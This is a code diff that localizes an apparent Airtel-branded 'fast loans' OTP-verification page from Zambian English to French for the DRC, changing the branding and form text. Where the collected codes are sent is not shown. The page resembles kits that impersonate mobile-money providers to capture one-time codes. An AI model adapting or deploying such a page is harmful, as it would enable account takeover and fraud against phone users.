@@ -18,7 +18,7 @@ function makeRefId() {
 }
 
 function formatPhone(p: string) {
-  if (!p) return 'your phone';
+  if (!p) return 'votre téléphone';
   return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
 }
 
@@ -276,16 +276,16 @@ function AirtelOTPVerify() {
             <line x1="3" y1="18" x2="21" y2="18" />
           </svg>
         </div>
-        {/* Updated Branding */}
-        <h1 className="airtel-logo">Airtel ZMW</h1>
-        <p className="airtel-tagline">Fast loans. Anytime. Anywhere.</p>
+        {/* Updated Branding to DRC */}
+        <h1 className="airtel-logo">Airtel DRC</h1>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
       <div className="airtel-card">
         {isVerifying ? (
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner" />
-            <h2 className="airtel-otp-heading">Verifying...</h2>
+            <h2 className="airtel-otp-heading">Vérification...</h2>
           </div>
         ) : (
           <>
@@ -294,18 +294,18 @@ function AirtelOTPVerify() {
                 <line x1="19" y1="12" x2="5" y2="12" />
                 <polyline points="12 19 5 12 12 5" />
               </svg>
-              Back to login
+              Retour à la connexion
             </button>
 
-            <h2 className="airtel-otp-heading">Verify your code</h2>
+            <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
             <p className="airtel-otp-subtext">
-              Enter the {OTP_LENGTH}-digit code sent to{' '}
+              Saisissez le code à {OTP_LENGTH} chiffres envoyé à{' '}
               <strong>{formatPhone(phoneNumber)}</strong>
             </p>
 
             <form onSubmit={handleVerify}>
               <div className="airtel-input-group">
-                <label>Enter OTP code</label>
+                <label>Saisir le code OTP</label>
                 <div className="airtel-otp-container">
                   {otp.map((digit, index) => (
                     <input
@@ -346,7 +346,7 @@ function AirtelOTPVerify() {
               </div>
 
               <button type="submit" className="airtel-verify-btn">
-                Verify code
+                Vérifier le code
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                   <line x1="5" y1="12" x2="19" y2="12" />
                   <polyline points="12 5 19 12 12 19" />
@@ -362,10 +362,10 @@ function AirtelOTPVerify() {
                 {isResending ? (
                   <span className="airtel-btn-loading">
                     <span className="airtel-spinner airtel-spinner-dark" />
-                    Sending...
+                    Envoi en cours...
                   </span>
                 ) : (
-                  'Resend code'
+                  'Renvoyer le code'
                 )}
               </button>
             </form>
